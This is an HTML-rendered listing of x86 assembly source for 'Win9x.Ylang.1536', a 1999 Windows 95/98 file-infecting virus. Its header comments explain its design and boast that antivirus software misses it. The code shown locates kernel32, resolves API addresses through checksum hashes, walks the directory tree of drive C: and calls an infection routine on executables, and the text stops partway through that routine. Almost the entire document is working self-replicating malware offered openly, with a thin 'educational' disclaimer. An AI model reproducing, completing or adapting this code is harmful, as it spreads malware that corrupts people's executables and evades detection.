<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ylang.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">




</span><span class="sc1">;WIN9X.YLANG.1536 VIRUS BY DR.L /[TECHNOLOGICAL ILLUSION]/V.19/Nov-Dec 1999 </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This is my first virus designed for ms-windows</span><span class="sc0">
</span><span class="sc1">;I have tested it only under Win95 os, but i think it works on win98 too!</span><span class="sc0">
</span><span class="sc1">;The virus isn't destructive as far i know but it's a virus, so be carefull!</span><span class="sc0">
</span><span class="sc1">;The current version of Win9x.Ylang is not detected by main anti-virus</span><span class="sc0">
</span><span class="sc1">;programs (avp don't caught it)...so once again BE CAREFULL!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description:</span><span class="sc0">
</span><span class="sc1">;This virus search for PE-exe files using a directory-tree search algo</span><span class="sc0">
</span><span class="sc1">;(hi LJ! ) on drive C:</span><span class="sc0">
</span><span class="sc1">;The virus appends to the end of code section  a loader.</span><span class="sc0">
</span><span class="sc1">;The entry point is modidified to point to this loader.</span><span class="sc0">
</span><span class="sc1">;The loader aim is to decrypt the main code put at the end of last section</span><span class="sc0">
</span><span class="sc1">;and to put the decrypted code into the stack and...executes it there!</span><span class="sc0">
</span><span class="sc1">;Result: the virus dont modify sections flag, this means if a section isn't</span><span class="sc0">
</span><span class="sc1">;originally writable ,after infection it has still read only attributes!</span><span class="sc0">
</span><span class="sc1">;There is one exception...first section is marked as Executable...</span><span class="sc0">
</span><span class="sc1">;but in most of the cases...first section is the code section of host!</span><span class="sc0">
</span><span class="sc1">;Previous version of this virus is detected by avp !</span><span class="sc0">
</span><span class="sc1">;The first version of Win9x.Ylang was only running only on Win95...not Win98..</span><span class="sc0">
</span><span class="sc1">;The reason was hard to find for me ...</span><span class="sc0">
</span><span class="sc1">;In kernel32.dll of Win95, the apis with no names are put in first places in the</span><span class="sc0">
</span><span class="sc1">;big table of pointers to apis addresses...in Win98 isn't true at all!</span><span class="sc0">
</span><span class="sc1">;(Don't trust no one...er...i mean: in vx oriented zines ,infos aren't always</span><span class="sc0">
</span><span class="sc1">;true! keep in Mind this point when trying to design viruses ;))</span><span class="sc0">
</span><span class="sc1">;The last point is ,this virus uses crc-like/checksum technics to</span><span class="sc0">
</span><span class="sc1">;retrieve apis addresses needed to perform infection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Known bugs: the virus isn't fully EXE-packed aware !</span><span class="sc0">
</span><span class="sc1">;this means some infected packed EXE-files will not work after infection :(</span><span class="sc0">
</span><span class="sc1">;but most packed files will only warn you it was modified and will still work</span><span class="sc0">
</span><span class="sc1">;after infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Thanks go to:</span><span class="sc0">
</span><span class="sc1">;(no order ;)</span><span class="sc0">
</span><span class="sc1">;                 Star0     : 32 bits crc-like rulez!</span><span class="sc0">
</span><span class="sc1">;                 Evul      : your help was usefull</span><span class="sc0">
</span><span class="sc1">;                 Cryptic   : tx to have tested the 1st version</span><span class="sc0">
</span><span class="sc1">;                 T!%%%     : Destroy isn't play! ;) (better not to sign </span><span class="sc0">
</span><span class="sc1">;                           : your work!;))</span><span class="sc0">
</span><span class="sc1">;                           ; tx for optimization advice ;)</span><span class="sc0">
</span><span class="sc1">;                 Darkman   : tx to publish this source!</span><span class="sc0">
</span><span class="sc1">;                 TechnoP   : are you still living? (contact me!)</span><span class="sc0">
</span><span class="sc1">;                 Lord Julus: Vxtazy #1 is good...</span><span class="sc0">
</span><span class="sc1">;                           : but can u optimize your code? </span><span class="sc0">
</span><span class="sc1">;                           : optimization sometime= code more clear!</span><span class="sc0">
</span><span class="sc1">;                 V****     : RSA rulez! </span><span class="sc0">
</span><span class="sc1">;                 Lethal    : FR**** do it better!</span><span class="sc0">
</span><span class="sc1">;                 MI*T      : IRC kills viruses coding :(</span><span class="sc0">
</span><span class="sc1">;                 delar**0  : Learn asm32win,troyan are better in asm32win!</span><span class="sc0">
</span><span class="sc1">;                 dyrdyr    : Arithmetic rules!</span><span class="sc0">
</span><span class="sc1">;          </span><span class="sc0">
</span><span class="sc1">;                 Tx go to lota people from v**us channel ,</span><span class="sc0">
</span><span class="sc1">;                 you know, who you  are!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;DISCLAIMER: i m not responsible for misuse of this virus,same way</span><span class="sc0">
</span><span class="sc1">;fireguns enterprises can't be held for responsible when a teenager</span><span class="sc0">
</span><span class="sc1">;kills 10 others teenagers using their products!</span><span class="sc0">
</span><span class="sc1">;This virus was written for educationnal aims .</span><span class="sc0">
</span><span class="sc1">;if you don't know what you're doing...please don't use it!</span><span class="sc0">









 </span><span class="sc9">extrn</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0"> 
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                                          </span><span class="sc1">;executable code starts here</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc1">;***** Loader part</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">BeginVir0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EndVir</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc0">               </span><span class="sc1">;not necessary</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LoaderLength</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        
       
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

 </span><span class="sc5">BeginVir0</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirLength0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">



</span><span class="sc1">;***** End of loader part</span><span class="sc0">


 </span><span class="sc5">BeginVir</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;real start of virus</span><span class="sc0">


</span><span class="sc1">;***** Search kernel32.dll address in memory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;***** Out:edx=kernel32.dll address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

 </span><span class="sc6">Loop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc6">Loop</span><span class="sc0">

 </span><span class="sc5">MZ_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0"> 

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> 

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 

        </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc6">Loop</span><span class="sc0">                           </span><span class="sc1">;this test avoid fault page </span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc3">"EP"</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc6">Loop</span><span class="sc0"> 

</span><span class="sc1">;***** end of search kernel routine</span><span class="sc0">



</span><span class="sc1">;[Compute delta offset ]:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delt</span><span class="sc0">                                    

 </span><span class="sc5">Delt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> 

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delt</span><span class="sc0">




        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_Stack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;save original</span><span class="sc0">
       
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_Stack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">VirLength0</span><span class="sc0">   </span><span class="sc1">;stack address</span><span class="sc0">


</span><span class="sc1">;***** Searching Apis Addresses</span><span class="sc0">

</span><span class="sc1">;In : edx=IMAGE BASE of KERNEL32</span><span class="sc0">
</span><span class="sc1">;Out: Searched Apis addresses are put in a Table of Dword</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;eax=RVA of PE-header</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;eax=Address of PE-header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;eax=RVA of EXPORT DIRECTORY section</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;eax=Address of EXPORT DIRECTORY section</span><span class="sc0">

       
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;esi=RVA of the table containing pointers</span><span class="sc0">
                               </span><span class="sc1">;to the names of exported functions</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;esi=Address of this table,</span><span class="sc0">
                               </span><span class="sc1">;a pointer to the name of the first </span><span class="sc0">
                               </span><span class="sc1">;exported function</span><span class="sc0">
           
        

        
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;Api number</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ApiNb</span><span class="sc0">                         </span><span class="sc1">;number of Apis remaining</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> 
          
 </span><span class="sc5">MainLoop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;***** Crc computing of the current Api name</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;In: </span><span class="sc0">
</span><span class="sc1">;     esi: RVA of name</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Out: Crc variable  contains the Crc of current name</span><span class="sc0">

        
 </span><span class="sc5">ComputeCrc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">


        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc5">Again</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">Lodsb</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SeeU</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Again</span><span class="sc0"> 

 </span><span class="sc5">SeeU</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Crc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">


</span><span class="sc1">;***** End of crc computing routine</span><span class="sc0">



</span><span class="sc1">;***** test Crc</span><span class="sc0">

        
</span><span class="sc1">;In:  Esi: Current Api name address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Out: Esi= following name</span><span class="sc0">
</span><span class="sc1">;     Ecx= Api (pointer) # in  the "table of names" </span><span class="sc0">





 </span><span class="sc5">TestCrc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Crc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ApiNb</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ApiList</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">MainLoop</span><span class="sc0">

        </span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">
     
        </span><span class="sc6">pushad</span><span class="sc0">
  
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ApiList</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;Api position</span><span class="sc0">
                                                      </span><span class="sc1">;in our table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> 

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> 

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">  

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
       
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
       
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
      
        </span><span class="sc6">popad</span><span class="sc0"> 

        </span><span class="sc6">Loop</span><span class="sc0"> </span><span class="sc5">MainLoop</span><span class="sc0">
         
</span><span class="sc1">;***** End of crc test routine</span><span class="sc0">




</span><span class="sc1">;***** End of Apis searching routine</span><span class="sc0">



</span><span class="sc1">;***** Prepare return to host</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldEip</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CurrentEip</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;***** End prepare</span><span class="sc0">



</span><span class="sc1">;[Save current directory]:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DirExe</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">Dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;***** Main routine (directory-tree search algorythm)</span><span class="sc0">
 

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Depth</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> 

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc3">"\:C"</span><span class="sc0">

 </span><span class="sc5">Find0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Depth</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;******  InfectCurrentDir</span><span class="sc0">
         

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">        

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">FindMatch</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindF</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">           
       
 
 </span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindF</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">

</span><span class="sc1">;***** End of infect current dir routine</span><span class="sc0">


</span><span class="sc1">;[Findfirst dir]:</span><span class="sc0">

 </span><span class="sc5">FindF</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">FindMatch2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0"> 

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Updir0</span><span class="sc0">

 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">

         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindN</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">

         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Find0</span><span class="sc0">
        
</span><span class="sc1">;[FindNext dir routine]:</span><span class="sc0">

 </span><span class="sc5">FindN</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

